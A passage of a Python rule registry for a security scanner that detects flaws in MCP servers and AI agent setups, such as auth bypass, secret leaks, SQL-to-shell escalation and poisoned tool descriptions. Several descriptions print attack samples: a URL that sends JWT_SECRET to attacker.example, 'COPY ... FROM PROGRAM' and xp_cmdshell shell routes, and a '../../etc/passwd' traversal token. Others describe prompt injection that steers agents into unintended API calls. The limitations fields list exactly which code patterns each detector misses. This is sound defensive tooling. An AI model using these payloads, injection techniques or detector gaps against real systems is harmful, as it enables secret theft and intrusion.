    "not conflate the two.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Enforce the same allowlist / read-only / non-destructive check inside "
    "the `tools/call` (execution) handler, not only in `tools/list` "
    "(discovery). Authorization must gate the action, not just its "
    "visibility — a denied tool must raise in the call path even when the "
    "client never listed it. Centralise the check (e.g. a shared "
    "`assert_tool_allowed(name)` called at the top of the call handler) so "
    "discovery and execution cannot drift apart.",
    sarif_name="McpToolGateAsymmetry",
    cve_references=[
        "CVE-2026-46519",
        # 2026-09-22. CVE-2026-77243 (mcp-atlassian < 0.22.0, HIGH 8.8,
        # CWE-862): ENABLED_TOOLS and TOOLSETS are applied when tools are
        # listed and not rechecked when tools/call is dispatched, so a client
        # that knows an excluded tool's name invokes it despite the operator's
        # least-privilege configuration. The same asymmetry this rule describes,
        # in the ENABLED_TOOLS family it already names. Also carried by the
        # package's version pin.
        "CVE-2026-77243",
    ],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI02"],
    limitations=(
        "In Python it compares the bodies of the functions named or decorated "
        "`list_tools` and `call_tool` (or dispatch, execute, run or invoke tool) for a "
        "fixed list of gate words (`allowed_tools`, `allow_only`, `read_only`, "
        "`readonly`, `non_destructive`, `destructive_tools`, `disable_destructive`). "
        "The gate has to be named in the list handler itself, so filtering done in a "
        "helper it calls, or under another name such as `TOOL_ALLOWLIST`, is not seen, "
        "and any mention of a gate word in the call handler, a log line included, "
        "counts as enforcing it."
    ),
)

_r(
    "AAK-MCP-ENV-PLACEHOLDER-EXFIL-001",
    "MCP server resolves ${VAR} placeholders against process.env on a "
    "user-supplied server config (secret exfiltration)",
    "An MCP server resolves `${VAR}` / `$VAR` placeholders against its own "
    "process environment (`process.env` in Node, `os.environ` / "
    "`os.path.expandvars` in Python) while parsing or validating a "
    "user-supplied MCP server config — typically the server URL. An "
    "authenticated user can then submit a URL like "
    "`https://attacker.example/?k=${JWT_SECRET}` and the server "
    "interpolates its own secrets into the outbound request, exfiltrating "
    "them to an attacker-controlled host. This is the CVE-2026-32625 class "
    "(LibreChat <= 0.8.3 resolved `${VAR}` against `process.env` during Zod "
    "validation of user-supplied MCP server URLs, leaking `CREDS_KEY`, "
    "`JWT_SECRET`, `MONGO_URI`, etc.; CWE-200, CVSS 9.6). Detected as a "
    "`${...}`-placeholder resolver that reads the process environment "
    "(`.replace(/.../, ... process.env ...)`, `os.path.expandvars(...)`, "
    "`.format(**os.environ)`) inside an MCP-server config/URL path.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Never expand environment placeholders found inside a user-supplied "
    "value. Treat the MCP server URL/config as untrusted data: reject or "
    "percent-encode `${...}` sequences, and resolve env references only "
    "from a server-side allowlist of config keys that are known-safe to "
    "echo — never the full `process.env` / `os.environ`. Validate the "
    "resolved URL host against an allowlist before connecting.",
    sarif_name="McpEnvPlaceholderExfil",
    cve_references=["CVE-2026-32625"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    limitations=(
        "Reads Python and JavaScript/TypeScript files that mention MCP, and matches "
        "three resolver shapes: `os.path.expandvars(...)` and `.format(**os.environ)` "
        "or `.format_map(os.environ)` in Python, and a `.replace(...)` whose `${...}` "
        "replacer reads `process.env` in JavaScript or TypeScript. A resolver written "
        "another way is not reported: a Python `re.sub` that looks each `${NAME}` up "
        "in `os.environ` is missed."
    ),
)

_r(
    "AAK-MCP-HTTP-NOAUTH-SERVER-001",
    "Published MCP HTTP/SSE server exposes an unauthenticated network-bound "
    "endpoint",
    "A repository publishes an MCP server over HTTP / SSE / Streamable-HTTP "
    "(an `/mcp` route handler, or an `SSEServerTransport` / "
    "`StreamableHTTPServerTransport` / `--http` setup) with no inbound "
    "authentication marker on the handler, while also binding to all "
    "interfaces (`0.0.0.0` / `::`) or serving a wildcard "
    "`Access-Control-Allow-Origin: *`. The result is a mutation-capable RPC "
    "endpoint, backed by the operator's own tokens, reachable without "
    "credentials by any network (or, with wildcard CORS, any cross-origin "
    "browser) peer. This is a recurring 2026 class: GitLab MCP Server "
    "(CVE-2026-44895), Nocturne Memory (CVE-2026-44830), and AgenticMail "
    "(CVE-2026-50287) all shipped auth-less HTTP/SSE MCP transports on "
    "`0.0.0.0` with wildcard CORS. Generalises the Azure-only "
    "`AAK-AZURE-MCP-NOAUTH-001` to any published MCP HTTP server (the Azure "
    "rule still owns Azure-MCP repos; this rule defers to it there). "
    "Beyond server source, this also flags the launch surface: MCP config "
    "files (`mcp.json`, `claude_desktop_config.json`, `*.mcp.yaml` "
    "`command`/`args`), Docker `--host 0.0.0.0` / `-p 0.0.0.0:` publishes, "
    "and MCP Inspector / FastMCP startup args that bind a non-loopback "
    "interface (`0.0.0.0` / `::` / a routable IP) with no token / "
    "`requireAuth`, or with the Inspector kill-switch `DANGEROUSLY_OMIT_AUTH` "
    "set. CVE-2026-23744 (MCP Inspector, CVSS 9.8) is the motivating exemplar "
    "of the launch-bind variant; Censys counted ~12,520 MCP services exposed "
    "on the public internet in this shape. Two further 2026 instances of this "
    "exact class: CVE-2026-49257 (mcp-pinot <= 3.0.1, CVSS 10.0) defaults to "
    "an HTTP MCP server bound to `0.0.0.0:8080` with no authentication, "
    "exposing SQL execution as a confused deputy; CVE-2026-48989 (Windows-MCP "
    "< 0.7.5, CVSS 8.9) exposed the MCP control plane over HTTP without auth "
    "while enabling wildcard CORS. CWE-306 (Missing Authentication for "
    "Critical Function).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Require an inbound credential on every `/mcp` route / SSE handler "
    "(bearer/JWT/mTLS/API-key middleware) and fail closed when the "
    "credential is unset — never bypass auth when an `API_TOKEN` env var is "
    "empty. Bind the listener to `127.0.0.1` (or behind an authenticating "
    "reverse proxy) instead of `0.0.0.0`, never pass `--host 0.0.0.0` to the "
    "MCP Inspector / FastMCP without a token, never set "
    "`DANGEROUSLY_OMIT_AUTH`, and replace wildcard CORS with an explicit "
    "origin allowlist (see AAK's wildcard-CORS rule).",
    sarif_name="McpHttpServerNoAuth",
    cve_references=[
        "CVE-2026-44895", "CVE-2026-44830", "CVE-2026-50287", "CVE-2026-23744",
        "CVE-2026-49257", "CVE-2026-48989",
        # 2026-09-14 wave. CVE-2026-90617 (PentestAgent) is scored for its
        # os-command-injection consequence, but upstream issue #90 names the
        # root cause as this shape: `--host` defaulting to 0.0.0.0 on an MCP
        # HTTP server with no auth middleware, which is what makes `run_task`
        # reachable at all. The sink half is AAK-TAINT-001.
        "CVE-2026-90617",
        # CVE-2026-38924 (Oraios AI Serena < 1.0.0) is the plain form of this
        # rule with nothing else attached: the MCP server's HTTP-mode listen
        # address was 0.0.0.0. Upstream fixed it by changing the default to
        # localhost (commit b00ae292, "The previous default 0.0.0.0 was a
        # potential security hazard"). No new rule: shape already owned here.
        "CVE-2026-38924",
        # 2026-09-15 wave — four more instances of this exact shape, each also
        # carrying a version pin of its own:
        # CVE-2026-59971 (mysql-mcp-server, 10.0) SSE transport with no
        #   security_settings and a 0.0.0.0 default, reaching execute_sql.
        # CVE-2026-53710 (MCP Context Forge, 10.0) HTTP/SSE exposes the
        #   execute_code tool of python_sandbox_server without auth.
        # CVE-2026-57139 (praisonai npm, 9.8) startHttp() binds with no host
        #   restriction and dispatches every POST without authentication.
        # CVE-2026-61560 (@zereight/mcp-gitlab, 9.8) SSE=true exposes every
        #   tool unauthenticated, which is what makes its file read reachable.
        "CVE-2026-59971", "CVE-2026-53710", "CVE-2026-57139", "CVE-2026-61560",
        # 2026-09-15..18 wave. Four more of this shape, none of them pinnable —
        # see CHANGELOG.cves.md for why each artifact is out of the detector's
        # reach, and the pins that DO exist for that wave:
        # CVE-2026-54618 (Obsidian Web MCP, 9.4) /oauth/authorize issues a code
        #   with no login, consent or session check and /oauth/token exchanges
        #   it for the static VAULT_MCP_TOKEN, so /mcp serves the whole vault.
        # CVE-2026-54504 (MCP Documentation Server, 8.8) app.listen(PORT) with
        #   no host binds the unauthenticated document API to every interface.
        # CVE-2026-58197 (ToolHive, 8.8) the API and MCP proxy endpoints are
        #   reachable without authentication from an unisolated container.
        # CVE-2026-54446 (netlicensing-mcp, 8.1) a request with no credential
        #   falls back to the operator's key; also pinned in its own rule.
        "CVE-2026-54618", "CVE-2026-54504", "CVE-2026-58197", "CVE-2026-54446",
        # 2026-09-22 wave. Two more of the credential-fallback variant, both in
        # mcp-atlassian and both already covered by its 0.22.0 pin:
        # CVE-2026-77244 (10.0) AtlassianOpaqueTokenVerifier accepts an
        #   unverified identity and _get_fetcher falls back to the operator's
        #   global Jira/Confluence credentials.
        # CVE-2026-77254 (9.1) the same fallback over streamable-http with no
        #   per-user identity at all.
        # Same inversion as CVE-2026-54446: a missing credential is treated as a
        # reason to supply the server's own.
        "CVE-2026-77244", "CVE-2026-77254",
    ],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    limitations=(
        "Source files are checked for a literal `0.0.0.0` or `::` bind or a wildcard "
        "CORS setting, so a Node server that calls `listen(3000)` with no host, which "
        "binds every interface, is not treated as exposed. In compose, Dockerfile and "
        "JSON or YAML launch files, any `api_key`, `bearer`, `Authorization` or "
        "`--token` text counts as inbound authentication, including the server's own "
        "outbound `OPENAI_API_KEY`."
    ),
)

_r(
    "AAK-LLM-SQL-RCE-001",
    "LLM-generated SQL executed on an RCE-capable database role",
    "An agent / LLM application feeds model-generated SQL into a database "
    "executor whose connection role holds code-execution or filesystem "
    "privileges, turning prompt-injected SQL into remote code execution. Two "
    "arms fire this rule: (a) an LLM-output value reaches a SQL-execution sink "
    "(`cursor.execute` / `conn.execute` / SQLAlchemy `text(...)` / a TS "
    "`.query()`/`.raw()` call) as the query itself — not as a bound "
    "parameter — with no allow-list or query-validation step; and (b) a DB "
    "connection string / role that grants the dangerous primitives (a "
    "superuser connection account, or a literal PostgreSQL "
    "`COPY ... FROM PROGRAM` / `pg_execute_server_program`, MySQL `FILE` / "
    "`INTO OUTFILE` / `LOAD_FILE`, or MS SQL `xp_cmdshell`) inside an "
    "LLM/agent context. CVE-2026-25879 is the documented instance: a "
    "text-to-SQL chat agent ran model output on a superuser connection and a "
    "prompt-injected `COPY ... FROM PROGRAM` produced a shell. CWE-94 (Code "
    "Injection) / CWE-89 (SQL Injection) chained to CWE-78 (OS Command "
    "Injection) through CWE-250 (Execution with Unnecessary Privileges). This "
    "is distinct from `AAK-TAINT-005`, where the tainted source is a tool "
    "*parameter* string-formatted into SQL rather than LLM output landing on "
    "an RCE-capable role.",
    Severity.CRITICAL,
    Category.TAINT_ANALYSIS,
    "Never execute LLM-generated SQL directly. Constrain the model to "
    "parameterised, allow-listed queries (validate with `sqlglot`/`sqlparse` "
    "and reject anything that is not a single read-only `SELECT` against an "
    "approved table set), and run every agent query on a dedicated "
    "least-privilege, read-only role that lacks `pg_execute_server_program` / "
    "`FILE` / `xp_cmdshell` and cannot `COPY ... FROM PROGRAM`. Treat the DB "
    "role as the last line of defence: even a perfect prompt filter must not "
    "sit in front of a superuser connection.",
    sarif_name="LlmSqlRce",
    cve_references=["CVE-2026-25879"],
    owasp_agentic_references=["ASI02", "ASI05"],
    adversa_references=["ADV-INJECT-07"],
    limitations=(
        "The flow arm follows model output through assignments into the first "
        "argument of a call named `execute`, `executemany`, `executescript` or "
        "`exec_driver_sql`; LangChain's `db.run(sql)` is not a sink. Any "
        "identifier, import or string in the file containing `sqlglot`, `sqlparse`, "
        "`allowlist` or `whitelist` switches that arm off, so `sqlparse.format(sql, "
        "reindent=True)`, which only pretty-prints, counts as validation. The "
        "privilege arm judges the database role from a literal connection URI or "
        "literal SQL text in the source: a DSN read from `os.environ` is not seen."
    ),
)

_r(
    "AAK-SKILL-UNTRUSTED-EXEC-PATH",
    "Untrusted-search-path executable override in skill/install flow",
    "Install or skill-setup code resolves an executable, interpreter, or build "
    "tool from a workspace-controlled source and runs it without an "
    "absolute-path pin or allowlist, so the workspace decides which binary "
    "executes. Detected sources: a `.env` / dotenv-sourced variable "
    "(`load_dotenv()` then `os.environ.get(...)` / `os.getenv(...)` / "
    "`dotenv_values(...)`), a `PATH` prepended with a non-absolute / workspace "
    "directory (`os.environ['PATH'] = os.getcwd() + os.pathsep + ...`), "
    "`shutil.which(...)` resolved over such a tainted `PATH`, or a Homebrew / "
    "package-manager binary chosen via an env override (`HOMEBREW_*` / `BREW`). "
    "Anchor: CVE-2026-53819 (CWE-426 Untrusted Search Path, CVSS 8.7) — "
    "OpenClaw before 2026.5.27 let a workspace `.env` override the Homebrew "
    "executable selection during skill install, executing unintended "
    "Homebrew-compatible binaries to compromise the system. This is an "
    "install-time code-execution sink, distinct from `AAK-CLAUDE-WIN-001` (a "
    "Windows ProgramData config-path hijack) and from the `AAK-SKILL-001..005` "
    "SKILL.md content checks.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Pin the executable to an absolute path; do not resolve build tools from "
    "workspace-controlled env. Hard-code the trusted binary location (e.g. "
    "`/opt/homebrew/bin/brew`) or validate the resolved path against an "
    "allowlist with `os.path.isabs` before exec, and never let a workspace "
    "`.env` or a workspace-relative `PATH` prepend select the interpreter / "
    "build tool used during skill setup.",
    sarif_name="SkillUntrustedExecPath",
    cve_references=["CVE-2026-53819"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-PATH-01"],
    limitations=(
        "Reads .py, .sh and .bash files whose name or content looks like install or "
        "skill-setup code. In Python the sinks are `subprocess.run`, `call`, "
        "`check_call`, `check_output`, `getoutput`, `getstatusoutput`, a lowercase "
        "`popen` and the `os.system`, `os.popen`, `os.exec*` and `os.spawn*` calls, "
        "so `subprocess.Popen([brew, ...])` and `asyncio.create_subprocess_exec` "
        "are not reported. A mention of `os.path.isabs`, an allowlist or "
        "`ALLOWED_BINARIES` anywhere in the file clears it, whatever it guards, and "
        "an install script written in JavaScript is not read."
    ),
)

_r(
    "AAK-MCP-ARGV-TOCTOU-001",
    "Argv re-built after allowlist approval before spawn (command-injection TOCTOU)",
    "A command / argv buffer is approved against an allow/deny list and then "
    "reassigned, re-split (`shlex.split` / `.split()`), re-joined, "
    "concatenated, `.extend()`/`.push()`-ed, or otherwise rebuilt before it is "
    "passed to a process-spawn sink (`subprocess.run`/`Popen`/`call`, "
    "`os.exec*` / `os.system`; Node `child_process.spawn`/`exec`/`execFile`, "
    "`execa`) — with no re-validation between the mutation and the spawn. The "
    "executed command shape therefore differs from the one that was approved, "
    "so an attacker-controlled argv can pass the allowlist check and still "
    "reach the shell. Anchor: CVE-2026-53822 (CVSS 8.8) — OpenClaw before "
    "2026.5.18 contained a command injection where the shell wrapper argv "
    "could change between approval and execution. CWE-77 (Command Injection) "
    "chained to CWE-367 (Time-of-check Time-of-use Race Condition). Detected "
    "as an ordered approve -> mutate -> exec data flow on the same command "
    "variable; distinct from `AAK-SSRF-TOCTOU-001` (a URL allow-list "
    "DNS-rebind TOCTOU, not command spawn).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Validate the exact argv array that will be executed, and execute that "
    "same immutable buffer — never re-parse, re-split, re-join, or append to "
    "the command after the allowlist check. If a transform is unavoidable, "
    "re-run the allowlist/deny check on the final argv immediately before "
    "spawning, pass an explicit argv list (never a shell string) with "
    "`shell=False`, and freeze the approved value (e.g. a tuple) so it cannot "
    "be mutated. Pin OpenClaw >= 2026.5.18.",
    sarif_name="ArgvAllowlistToctou",
    cve_references=["CVE-2026-53822"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-07"],
    limitations=(
        "In Python a spawn is recognised by its spelling: `subprocess.run`, `call`, "
        "`Popen`, `check_call` or `check_output`, or `os.system`, `os.popen`, "
        "`os.exec*`, `os.spawnv`, `os.spawnl` or `os.spawnvp`. A function imported by "
        "name (`from subprocess import run`) or a module alias (`import subprocess as "
        "sp`) is missed. In TypeScript only the first argument of `spawn`, `exec`, "
        "`execFile`, `execa` or their Sync forms is followed, so an argv array passed "
        "second (`spawn(bin, args)`) and changed after the check is not."
    ),
)

_r(
    "AAK-MCP-NOAUTH-DEFAULT",
    "MCP server unauthenticated-by-default / fail-open authentication",
    "An MCP server ships an authentication check that does not actually "
    "enforce — distinct from a transport with no auth at all "
    "(`AAK-MCP-HTTP-NOAUTH-SERVER-001`). Three shapes are flagged: (a) an "
    "auth / `is_authorized` / `verify_token`-style function that returns a "
    "truthy/allow value when the secret or token is empty or unset "
    "(`if not SECRET: return True`); (b) a default / placeholder secret literal "
    "— a secret-named variable set to `\"\"` / `\"changeme\"` / `\"secret\"` / "
    "`\"admin\"` etc., or `os.environ.get(\"X_SECRET\", \"\")` with an empty "
    "default, so the server runs unauthenticated until an operator intervenes; "
    "(c) a missing-secret check that only logs a warning and continues while "
    "the server binds a non-loopback interface (`0.0.0.0` / `::`). Anchor: "
    "CVE-2026-48814 (Network-AI, CVSS 9.1) — an incomplete fix of "
    "CVE-2026-46701 whose added auth gate still admitted requests when the "
    "secret was unset. CWE-306 (Missing Authentication for Critical Function) "
    "+ CWE-862 (Missing Authorization).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Fail closed: reject every request when the secret/token is empty, unset, "
    "or still a default — never `return True` on an empty credential and never "
    "ship a placeholder secret. Require the secret with no empty fallback "
    "(`os.environ[\"MCP_SECRET\"]`, erroring if absent), compare with a "
    "constant-time check, bind to `127.0.0.1` behind an authenticating proxy, "
    "and turn any 'no secret set' warning into a hard startup failure. Pin "
    "Network-AI past the CVE-2026-48814 fix.",
    sarif_name="McpNoAuthDefault",
    cve_references=["CVE-2026-48814", "CVE-2026-46701"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "In a .py file that mentions MCP (the whole word `mcp`, `FastMCP`, "
        "`McpServer`, `Server(`, `modelcontextprotocol` or `mcpServers`, in any case) "
        "it flags a variable whose name contains secret, token, api_key, apikey, "
        "password, passwd, auth_key (also authkey) or auth_token when it is set to one "
        "of '', changeme, change-me, change_me, secret, password, passwd, admin, "
        "default, token, test, placeholder, xxx, none, your-secret-here, "
        "your_secret_here, your-token-here or example (any case) or read from the "
        "environment with an empty second argument (`os.environ.get(\"X\", \"\")`), a "
        "function named is_authorized, authorize, check_auth, verify_token, "
        "verify_auth, require_auth, validate_token, validate_auth or authenticate (any "
        "case, an optional leading underscore, the underscore inside the name "
        "optional, -ise spellings too) that returns a truthy constant when the secret "
        "is empty, and a missing-secret check whose body calls a function whose name "
        "contains warn, logger, getLogger or print (any case; `logging.warning(...)` "
        "and `logger.info(...)` count, `logging.error(...)` does not) and has no "
        "raise, return or call whose name contains lowercase exit or abort, in a file "
        "that contains `0.0.0.0`, `[::]` or a quoted `::`. In files whose extension is "
        ".json, .yaml, .yml, .toml or .env that mention MCP in the same way and "
        "contain one of those addresses it flags a key containing secret, token, "
        "api_key (also api-key, apikey), password or auth_key (also auth-key, authkey) "
        "set to '' or one of changeme, change-me, change_me, secret, password, admin, "
        "default, placeholder, xxx, example, token or test (any case), and auth "
        "switched off by a flag: auth, authentication, authorization, auth_config, "
        "require_auth, requireauth, security or governance set to a value starting "
        "with false, 0, no, off or disabled, directly or through an enabled, "
        "is_enabled, required or require key within 120 characters, or disable_auth, "
        "no_auth, auth_disabled, skip_auth or allow_anonymous set to a value starting "
        "with true, 1, yes or on. A weak non-empty default (`os.environ.get(\"X\", "
        "\"changeme\")`) and an empty default passed by keyword (`os.getenv(\"X\", "
        "default=\"\")`) are not flagged, and neither is the same pattern in a file "
        "that mentions none of the MCP words above or, for the warning check and the "
        "config files, contains none of those addresses, which covers a loopback bind "
        "and a host read from the environment."
    ),
)

_r(
    "AAK-MCP-AUTH-PATHTRAVERSAL-001",
    "MCP bearer-token joined into a session file path (path traversal)",
    "MCP server authentication code concatenates or `os.path.join`-es an "
    "untrusted token / bearer credential into a filesystem path that is then "
    "used for a session existence / read check, without rejecting path "
    "separators / `..` or resolving-and-containing the result. Because the "
    "caller controls the token, they control the path: a value like "
    "`../../etc/passwd` or `../<another-user-session>` escapes the intended "
    "session directory, turning an auth check into arbitrary-file access and "
    "cross-session takeover. Anchor: CVE-2026-52830 (CVSS 9.4, CWE-22 Path "
    "Traversal) — `fast-mcp-telegram` before 0.19.1 joined the caller-supplied "
    "bearer token straight into the session file path used to test whether a "
    "session existed, so a crafted token traversed out of the session "
    "directory; fixed in 0.19.1. The Python detector is a stdlib-`ast` taint "
    "flow (token source -> path construction -> `exists`/`open` sink, "
    "suppressed by a separator/`..` reject or a resolve-and-contain guard); "
    "TS/JS/Rust use the analogous concat-into-path regex. Distinct from "
    "`AAK-MCP-015` (a resource-handler path traversal on a request *path* "
    "parameter) — here the tainted source is the auth *token* itself.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Reject path separators and `..` in the token before it touches the "
    "filesystem; resolve the constructed session path (`os.path.realpath` / "
    "`Path.resolve()`) and verify it is inside the intended session directory "
    "(`startswith` / `Path.is_relative_to`) before use; prefer a hashed / "
    "opaque session id over the raw token as a filename. Upgrade "
    "`fast-mcp-telegram` to >= 0.19.1.",
    sarif_name="McpAuthPathTraversal",
    cve_references=["CVE-2026-52830"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-RES-01"],
    limitations=(
        "In Python it treats any of `secure_filename`, `is_relative_to`, "
        "`relative_to`, `normpath`, `realpath`, `abspath`, `os.sep`, `sep`, "
        "`commonpath`, `commonprefix`, `..`, `startswith`, `resolve(` or a "
        "`split(\"/\"` (any case, so `startsWith` counts) in the same function as a "
        "guard against traversal; in TypeScript, JavaScript and Rust files it is "
        "anywhere in the file. The `startswith(\"Bearer \")` that extracts the token "
        "is enough to silence it, though it checks nothing about the path."
    ),
)


# ---------------------------------------------------------------------------
# MCP Server Card (SEP-1649) — /.well-known/mcp/server-card.json static audit
# SEP-1649 (superseded-in-draft by SEP-2127) has servers publish a discovery
# card a client fetches and trusts BEFORE connecting; the card is a surface.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-CARD-001",
    "Poisoned tool description in an MCP server card",
    "A tool entry in a SEP-1649 server card "
    "(`/.well-known/mcp/server-card.json`) carries a `description` containing a "
    "tool-poisoning / imperative-injection payload — invisible Unicode, a "
    "prompt-injection directive, a cross-tool reference, or an encoded "
    "(base64/hex) blob. Because a client fetches and trusts the card *before* "
    "connecting, the injected instructions enter the model context ahead of any "
    "tool call. Detection reuses the AAK-POISON-001..006 detectors.",
    Severity.CRITICAL,
    Category.MCP_SERVER_CARD,
    "Treat a server card's tool descriptions as untrusted content: strip "
    "invisible Unicode, reject imperative/injection phrasing and encoded "
    "payloads, and render descriptions as data (never as instructions). Pin the "
    "card to a signed, provenance-verified publisher.",
    sarif_name="McpCardPoisonedTool",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SKILL-01"],
    limitations=(
        "Reads `tools[].description` in a committed card with the phrase lists of "
        "AAK-POISON-001..004, so the same wording gaps apply. Text in a tool's "
        "`title`, or in the parameter descriptions of its `inputSchema`, is not "
        "read."
    ),
)

_r(
    "AAK-MCP-CARD-002",
    "MCP server card transport / advertised-capability mismatch",
    "A SEP-1649 server card's declared `transport` disagrees with its "
    "advertised capabilities: a remote transport (`http`/`sse`/`streamable-http`/"
    "`ws`, or a routable `endpoint` URL) while `authentication.required` is "
    "`false` (an anyone-can-connect network endpoint), or a `stdio`/local "
    "transport that nonetheless advertises a remote `endpoint`. A client that "
    "provisions based on the card's advertised shape connects to a transport it "
    "did not expect.",
    Severity.HIGH,
    Category.MCP_SERVER_CARD,
    "Make the card's `transport` and `authentication` consistent: require an "
    "inbound credential on every remote transport, and do not advertise a "
    "remote `endpoint` on a `stdio`/local card. Regenerate the card from the "
    "server's real runtime configuration.",
    sarif_name="McpCardTransportMismatch",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reports a remote transport only when `authentication.required` is the JSON "
        "boolean `false`. A remote transport with no `authentication` block at all, "
        "or with `\"required\": \"false\"` as a string, is not reported, and the "
        "endpoint is read from the `transport` object only: a top-level `url` is "
        "ignored."
    ),
)

_r(
    "AAK-MCP-CARD-003",
    "MCP server card missing or invalid signature / provenance",
    "A SEP-1649 server card carries no `signature` / `provenance` / "
    "`attestation` / `publisher` field, or one that is empty / a placeholder. "
    "The card's self-declared tool list, transport, and endpoint are then "
    "trusted with no proof of origin — a MITM or a typosquatting host can serve "
    "a forged card at the well-known path and the client will provision against "
    "it.",
    Severity.HIGH,
    Category.MCP_SERVER_CARD,
    "Sign the server card (detached signature or an `attestation` block) and "
    "have clients verify it against a pinned publisher key before provisioning. "
    "Populate `publisher` / `provenance` with a verifiable identity — never a "
    "placeholder.",
    sarif_name="McpCardUnsignedProvenance",
    owasp_mcp_references=["MCP03:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-08"],
    limitations=(
        "Checks that a `signature`, `signatures`, `provenance`, `attestation`, "
        "`publisher` or `verified` field exists and is not empty or a placeholder "
        "(`todo`, `unsigned`, `xxx` and the like). It never verifies a signature, "
        "so `\"signature\": \"not-a-real-signature\"` or `\"verified\": true` satisfies "
        "it."
    ),
)

_r(
    "AAK-MCP-CARD-004",
    "Over-broad capability claims in an MCP server card",
    "A SEP-1649 server card asserts over-broad capabilities: a wildcard auth "
    "scope (`*` / `all`), a `capabilities` object with everything enabled and "
    "no constraint, or `authentication.required: true` paired with an empty "
    "`schemes` list (no enforceable method). Over-broad claims invite clients "
    "to grant more trust / scope than the server needs, widening blast radius "
    "on compromise.",
    Severity.MEDIUM,
    Category.MCP_SERVER_CARD,
    "Declare only the capabilities and scopes the server actually exposes; "
    "replace wildcard scopes with an explicit list, and pair "
    "`authentication.required: true` with at least one concrete scheme. "
    "Least-privilege the card.",
    sarif_name="McpCardOverBroadClaims",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Treats a scope as a wildcard only when it is exactly `*`, `all`, `any`, "
        "`full`, `admin`, `root` or `*:*`, so `mcp:*` or `tools:*` passes. A "
        "capability counts as asserted only when its value is the boolean `true`: a "
        "card that lists `tools`, `resources`, `prompts` and `logging` as objects "
        "is not reported."
    ),
)

_r(
    "AAK-MCP-KONG-CVE-2026-13341-001",
    "Kong Konnect MCP server < 1.0.0 (indirect prompt injection)",
    "The Kong Konnect MCP server before 1.0.0 is vulnerable to indirect prompt "
    "injection: untrusted content returned to the server (e.g. an API response, "
    "spec, or resource body it relays to the agent) can carry attacker-authored "
    "instructions that the agent then acts on, causing it to issue unintended "
    "Kong Admin/Konnect API requests it was never asked to make — a "
    "confidentiality-impacting cross-boundary injection, not a generic "
    "prompt-injection heuristic (CVE-2026-13341, CVSS 7.4 HIGH, published "
    "2026-07-03). A config that dispatches the Konnect MCP server at a version "
    "below 1.0.0 (or unpinned) is exposed.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Upgrade the Kong Konnect MCP server to >= 1.0.0 and pin it explicitly. "
    "Treat every API/spec/resource body the server relays as untrusted data "
    "(never as instructions), and constrain the agent's Konnect/Admin API "
    "credentials to the least scope the workflow needs so an injected request "
    "cannot reach sensitive endpoints.",
    sarif_name="KongKonnectMcpPromptInjection",
    cve_references=["CVE-2026-13341"],
    owasp_mcp_references=["MCP04:2025", "MCP06:2025"],
    owasp_agentic_references=["ASI01", "ASI04"],
    adversa_references=["ADV-INJECT-01"],
    limitations=(
        "Reads the `konnect-mcp` spelling (with an optional `kong-` or `@kong/` "
        "before it and `-server` after it) in manifests, `.mcp.json`, `mcp.json` "
        "and `claude_desktop_config.json` at the project root. The `mcp-konnect` "
        "order, as in `npx @kong/mcp-konnect@0.1.0`, is not matched, and a server "
        "configured in `.cursor/mcp.json` or `.vscode/mcp.json` is not read."
    ),
)

_r(
    "AAK-MCP-GATEWAY-REGISTRY-CVE-2026-14471-001",
    "Amazon mcp-gateway-registry < 1.0.13 (SQL injection)",
    "The Amazon `mcp-gateway-registry` before 1.0.13 improperly neutralizes a "
    "caller-supplied `table_name` in the metrics-service retention-policy "
    "component: the value is interpolated directly into an SQL statement in "
    "identifier position, so an authenticated remote user can execute arbitrary "
    "SQL against the gateway's metrics store (CVE-2026-14471, HIGH CVSS 8.1, "
    "CWE-89, published 2026-07-06). A project that depends on the gateway "
    "registry at a version below 1.0.13 (or unpinned) is exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-gateway-registry` to >= 1.0.13 and pin it explicitly. Never "
    "interpolate a request-supplied value into an SQL identifier position; "
    "validate `table_name` against a fixed allow-list of known table names, or "
    "quote it with the driver's identifier-quoting API rather than string "
    "formatting.",
    sarif_name="McpGatewayRegistrySqlInjection",
    cve_references=["CVE-2026-14471"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    limitations=(
        "Reads `mcp-gateway-registry` as text in the project root's "
        "requirements*.txt, pyproject.toml, Pipfile, Pipfile.lock, poetry.lock, "
        "uv.lock, package.json, package-lock.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and *.mcp.yaml/.yml files, and reports a file "
        "whose first mention has a version below 1.0.13 or none. It does not read a "
        "sub-directory, including a requirements file there, `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or a `pdm.lock`, `yarn.lock` or `pnpm-lock.yaml`."
    ),
)


# ---------------------------------------------------------------------------
